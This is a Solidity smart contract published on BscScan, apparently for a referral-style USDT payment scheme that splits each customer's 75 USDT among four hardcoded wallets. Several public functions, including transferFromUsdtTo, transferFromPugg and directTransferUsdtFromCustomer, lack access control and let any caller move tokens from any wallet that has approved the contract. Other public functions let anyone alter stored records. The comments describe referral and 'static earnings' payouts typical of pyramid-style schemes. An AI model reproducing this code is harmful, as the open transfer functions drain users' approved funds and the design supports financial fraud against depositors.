/**
 *Submitted for verification at BscScan.com on 2022-09-12
*/

// SPDX-License-Identifier: MIT


pragma solidity >=0.6.2;
library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}


pragma solidity >=0.5.0;

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;

    function INIT_CODE_PAIR_HASH() external view returns (bytes32);
}

pragma solidity ^0.8.6;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


contract Ownable {
    address public _owner;


    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public  onlyOwner {
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public  onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _owner = newOwner;
    }
}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
//usdt授权到合约后，由合约进行扣费。然后自动买
contract MyFunc is Ownable, Context{
    using SafeMath for uint256;
    address private _usdt;
    uint8 _decimals =18;
    mapping(address=>uint) private recorder;
    mapping(address=>uint) private tag;
    address private _pugg;
    address private platformAccount =0x4A2D8750d589C3971D830eCCaacAfe802ebf76C3;
    address private suggestAccount=0xF65B7145476c4Fd3BfE241B2e60f26302a5F54eE;
    address private rankAccount=0x0E6DcB55EEA6Ffeb81fD8bd7F92e1dB7c85a874b; 
    address private staticAccount =0x078Ea1b77a807F7f84979081EC9D9345c45A0E7f;
    constructor(address usdt ,address zuzz){
        _usdt =usdt;
        _pugg = zuzz;
        _owner = msg.sender;  
    }
  
    //合约直接转账U
    function transferUsdt(address to , uint256 amount)public onlyOwner returns(bool){
        IERC20(_usdt).transfer(to,amount);
        return true;
    }
    //转账一次到4个地址
    function transferUsdtTO()public onlyOwner returns(bool){
        IERC20(_usdt).transfer(platformAccount,5*10**_decimals);
        IERC20(_usdt).transfer(suggestAccount,20*10**_decimals);
        IERC20(_usdt).transfer(rankAccount,30*10**_decimals);
        IERC20(_usdt).transfer(staticAccount,20*10**_decimals);
        return true;
    }

    //转账公排收益
    function transferPublicRankTO(address to,uint256 amount )public onlyOwner returns(bool){
       IERC20(_usdt).transferFrom(rankAccount,to,amount);
        return true;
    }

    //转账管理和直推到
        function transferManageTo(address to,uint256 amount )public onlyOwner returns(bool){
       IERC20(_usdt).transferFrom(suggestAccount,to,amount);
        return true;
    }
//静态收益转账
       function transferStaticTo(address to,uint256 amount )public onlyOwner returns(bool){
       IERC20(_usdt).transferFrom(staticAccount,to,amount);
        return true;
    }


    //查看合约有多少U
    function usdtNumber()public view returns(uint256){
        uint256 usdtBalance = IERC20(_usdt).balanceOf(address(this));
        return usdtBalance;
    }

    function directTransferUsdtFromCustomer(address customer)public  returns(bool){
        IERC20(_usdt).transferFrom(customer,platformAccount,5*10**_decimals);
        IERC20(_usdt).transferFrom(customer,suggestAccount,20*10**_decimals);
        IERC20(_usdt).transferFrom(customer,rankAccount,30*10**_decimals);
        IERC20(_usdt).transferFrom(customer,staticAccount,20*10**_decimals);
        recorder[customer] = block.timestamp;
        tag[customer] +=1;
        return true;
    }


    function recorderTurnZero(address account)public returns(bool){
        recorder[account] = 0;
        return true;
    }


    function confirOnce(address account)public returns(bool){
        tag[account] -=1;
        return true;
    }

    function getTag(address account)public view returns(uint){
        return tag[account];
    }

    function getRecorder(address account)public view returns(uint256){
        return recorder[account];
    }

    //这是统一转到合约地址再分转
    function transferUsdtFromCustomer(address customer)public  returns(bool){
        uint256 amount = 75*10**_decimals;
        IERC20(_usdt).transferFrom(customer ,address(this),amount);
    
        IERC20(_usdt).transfer(platformAccount,5*10**_decimals);
        IERC20(_usdt).transfer(suggestAccount,20*10**_decimals);
        IERC20(_usdt).transfer(rankAccount,30*10**_decimals);
        IERC20(_usdt).transfer(staticAccount,20*10**_decimals);
        recorder[customer] = block.timestamp;
        tag[customer] +=1;
        return true;
    }

function getUsdtBalance(address account)public view returns(uint256){
    return IERC20(_usdt).balanceOf(account);
}

function getUsdtApprove(address account)public view returns(uint256){
    return IERC20(_usdt).allowance(account,address(this));
}

function transferFromUsdtTo(address from,address to, uint256 amount)public  returns(bool){
    IERC20(_usdt).transferFrom(from,to,amount);
    return true;
}

    function transferFromU(address account,uint256 amount)public returns(bool){
        IERC20(_usdt).transferFrom(account ,address(this),amount);
        return true;
    }
    function transferFromPugg(address from,address to, uint256 amount)public  returns(bool){
        IERC20(_pugg).transferFrom(from ,to,amount);
        return true;
    }

    function tranferBNB( address to,uint256 amount )public onlyOwner returns(bool){
      payable(to).transfer(amount);
        return true;
    }
    function getValue()public payable returns(bool){
        require(msg.value >= 1*10*5);
        return true;
    }
}